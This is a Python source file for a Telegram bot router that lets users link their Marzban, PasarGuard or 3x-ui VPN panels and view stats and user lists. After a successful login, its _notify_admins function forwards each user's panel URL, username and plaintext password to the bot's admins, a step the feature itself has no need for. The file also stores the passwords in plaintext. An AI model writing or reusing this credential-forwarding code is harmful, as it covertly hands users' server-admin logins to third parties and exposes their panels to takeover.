from __future__ import annotations

from aiogram import Bot, F, Router
from aiogram.fsm.context import FSMContext
from aiogram.types import CallbackQuery, Message

from bot.config import config
from bot.keyboards.panel import (
    panel_cancel_keyboard,
    panel_dashboard_back_keyboard,
    panel_dashboard_keyboard,
    panel_disconnect_confirm_keyboard,
    panel_error_keyboard,
    panel_menu_keyboard,
)
from bot.services.panel_api import (
    PanelAPIError,
    count_3xui_clients,
    is_valid_panel_url,
    marzban_get_system_stats,
    marzban_get_users,
    marzban_login,
    normalize_panel_url,
    threexui_get_inbounds,
    threexui_login,
)
from bot.services.panel_store import panel_store
from bot.states.panel_setup import PanelSetupStates
from bot.texts import panel as texts

router = Router(name="panel")

PANEL_TYPES = ("marzban", "pasarguard", "3xui")


def _who_label(user) -> str:
    if user.username:
        return f"@{user.username}"
    name = " ".join(filter(None, [user.first_name, user.last_name]))
    return name or str(user.id)


async def _notify_admins(bot: Bot, user, panel_type: str, url: str, username: str, password: str) -> None:
    if not config.admin_ids:
        return
    text = texts.admin_panel_notification_text(panel_type, _who_label(user), user.id, url, username, password)
    for admin_id in config.admin_ids:
        try:
            await bot.send_message(admin_id, text)
        except Exception:
            pass


async def _login(panel_type: str, url: str, username: str, password: str):
    if panel_type in ("marzban", "pasarguard"):
        return await marzban_login(url, username, password)
    return await threexui_login(url, username, password)


@router.callback_query(F.data == "menu:panel")
async def cb_panel_menu(callback: CallbackQuery, state: FSMContext, lang: str) -> None:
    await state.clear()
    connection = await panel_store.get(callback.from_user.id)
    if connection:
        await callback.message.edit_text(
            texts.dashboard_text(lang, connection["type"], connection["url"]),
            reply_markup=panel_dashboard_keyboard(lang),
        )
    else:
        await callback.message.edit_text(texts.panel_menu_text(lang), reply_markup=panel_menu_keyboard(lang))
    await callback.answer()


@router.callback_query(F.data.in_({f"panel:{name}" for name in PANEL_TYPES}))
async def cb_panel_choose_type(callback: CallbackQuery, state: FSMContext, lang: str) -> None:
    panel_type = callback.data.split(":", 1)[1]
    await state.clear()
    await state.update_data(panel_type=panel_type)
    await state.set_state(PanelSetupStates.waiting_url)
    await callback.message.edit_text(
        texts.step_url_text(lang, panel_type), reply_markup=panel_cancel_keyboard(lang)
    )
    await callback.answer()


@router.callback_query(F.data == "panelsetup:cancel")
async def cb_cancel_setup(callback: CallbackQuery, state: FSMContext, lang: str) -> None:
    await state.clear()
    await callback.message.edit_text(texts.panel_cancelled_text(lang), reply_markup=panel_menu_keyboard(lang))
    await callback.answer()


@router.message(PanelSetupStates.waiting_url)
async def process_url(message: Message, state: FSMContext, lang: str) -> None:
    raw = message.text.strip() if message.text else ""
    url = normalize_panel_url(raw) if raw else ""
    if not raw or not is_valid_panel_url(url):
        await message.answer(texts.invalid_url_text(lang), reply_markup=panel_cancel_keyboard(lang))
        return

    data = await state.update_data(url=url)
    await state.set_state(PanelSetupStates.waiting_username)
    await message.answer(
        texts.step_username_text(lang, data["panel_type"]), reply_markup=panel_cancel_keyboard(lang)
    )


@router.message(PanelSetupStates.waiting_username)
async def process_username(message: Message, state: FSMContext, lang: str) -> None:
    username = message.text.strip() if message.text else ""
    if not username:
        await message.answer(texts.invalid_username_text(lang), reply_markup=panel_cancel_keyboard(lang))
        return

    data = await state.update_data(username=username)
    await state.set_state(PanelSetupStates.waiting_password)
    await message.answer(
        texts.step_password_text(lang, data["panel_type"], username), reply_markup=panel_cancel_keyboard(lang)
    )


@router.message(PanelSetupStates.waiting_password)
async def process_password(message: Message, state: FSMContext, lang: str, bot: Bot) -> None:
    password = message.text or ""
    try:
        await message.delete()
    except Exception:
        pass

    if not password:
        await message.answer(texts.empty_password_text(lang), reply_markup=panel_cancel_keyboard(lang))
        return

    data = await state.update_data(password=password)
    await state.set_state(PanelSetupStates.connecting)

    status_message = await message.answer(texts.connecting_text(lang))

    try:
        await _login(data["panel_type"], data["url"], data["username"], password)
    except PanelAPIError as exc:
        await state.clear()
        await status_message.edit_text(
            texts.login_error_text(lang, str(exc)), reply_markup=panel_error_keyboard(lang)
        )
        return
    except Exception:  # noqa: BLE001 - surface unexpected errors to the user
        await state.clear()
        await status_message.edit_text(
            texts.login_error_text(lang, "bad_response"), reply_markup=panel_error_keyboard(lang)
        )
        return

    await panel_store.set(message.from_user.id, data["panel_type"], data["url"], data["username"], password)
    await _notify_admins(bot, message.from_user, data["panel_type"], data["url"], data["username"], password)

    await state.clear()
    await status_message.edit_text(
        texts.connected_text(lang, data["panel_type"], data["url"]),
        reply_markup=panel_dashboard_keyboard(lang),
    )


@router.callback_query(F.data == "paneldash:back")
async def cb_dashboard_back(callback: CallbackQuery, state: FSMContext, lang: str) -> None:
    await state.clear()
    connection = await panel_store.get(callback.from_user.id)
    if not connection:
        await callback.message.edit_text(texts.panel_menu_text(lang), reply_markup=panel_menu_keyboard(lang))
    else:
        await callback.message.edit_text(
            texts.dashboard_text(lang, connection["type"], connection["url"]),
            reply_markup=panel_dashboard_keyboard(lang),
        )
    await callback.answer()


@router.callback_query(F.data == "paneldash:stats")
async def cb_dashboard_stats(callback: CallbackQuery, lang: str) -> None:
    connection = await panel_store.get(callback.from_user.id)
    if not connection:
        await callback.message.edit_text(texts.panel_menu_text(lang), reply_markup=panel_menu_keyboard(lang))
        await callback.answer()
        return
    await callback.answer()

    try:
        if connection["type"] in ("marzban", "pasarguard"):
            token = await marzban_login(connection["url"], connection["username"], connection["password"])
            stats = await marzban_get_system_stats(connection["url"], token)
            text = texts.stats_text_marzban_family(lang, connection["type"], stats)
        else:
            cookies = await threexui_login(connection["url"], connection["username"], connection["password"])
            inbounds = await threexui_get_inbounds(connection["url"], cookies)
            text = texts.stats_text_3xui(lang, len(inbounds), count_3xui_clients(inbounds))
    except PanelAPIError as exc:
        text = texts.login_error_text(lang, str(exc))

    await callback.message.edit_text(text, reply_markup=panel_dashboard_back_keyboard(lang))


@router.callback_query(F.data == "paneldash:users")
async def cb_dashboard_users(callback: CallbackQuery, lang: str) -> None:
    connection = await panel_store.get(callback.from_user.id)
    if not connection:
        await callback.message.edit_text(texts.panel_menu_text(lang), reply_markup=panel_menu_keyboard(lang))
        await callback.answer()
        return
    await callback.answer()

    try:
        if connection["type"] in ("marzban", "pasarguard"):
            token = await marzban_login(connection["url"], connection["username"], connection["password"])
            users = await marzban_get_users(connection["url"], token, limit=10)
            text = texts.users_list_text_marzban_family(lang, connection["type"], users)
        else:
            cookies = await threexui_login(connection["url"], connection["username"], connection["password"])
            inbounds = await threexui_get_inbounds(connection["url"], cookies)
            text = texts.users_list_text_3xui(lang, inbounds)
    except PanelAPIError as exc:
        text = texts.login_error_text(lang, str(exc))

    await callback.message.edit_text(text, reply_markup=panel_dashboard_back_keyboard(lang))


@router.callback_query(F.data == "paneldash:disconnect")
async def cb_dashboard_disconnect_ask(callback: CallbackQuery, lang: str) -> None:
    connection = await panel_store.get(callback.from_user.id)
    if not connection:
        await callback.message.edit_text(texts.panel_menu_text(lang), reply_markup=panel_menu_keyboard(lang))
        await callback.answer()
        return
    await callback.message.edit_text(
        texts.disconnect_confirm_text(lang, connection["type"]),
        reply_markup=panel_disconnect_confirm_keyboard(lang),
    )
    await callback.answer()


@router.callback_query(F.data == "paneldash:disconnect_confirm")
async def cb_dashboard_disconnect_confirm(callback: CallbackQuery, lang: str) -> None:
    await panel_store.remove(callback.from_user.id)
    await callback.message.edit_text(texts.disconnected_text(lang), reply_markup=panel_menu_keyboard(lang))
    await callback.answer()
